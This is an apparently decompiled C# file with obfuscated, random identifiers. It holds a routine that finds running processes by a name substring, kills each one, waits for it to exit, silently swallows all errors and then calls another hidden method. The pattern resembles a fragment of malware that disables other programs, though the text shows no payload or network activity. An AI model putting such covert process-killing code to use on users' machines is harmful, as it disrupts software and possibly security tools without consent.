using System;
using System.Diagnostics;

namespace GfIOnzejDqtqB;

public sealed class oerTWqGQzePo
{
	public static bool ZFAZHZFaEZWP(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void VJSrhZLrVn(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (ZFAZHZFaEZWP(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					XpwFCiWTIXog.uXNwcPgUqXlzDEK();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
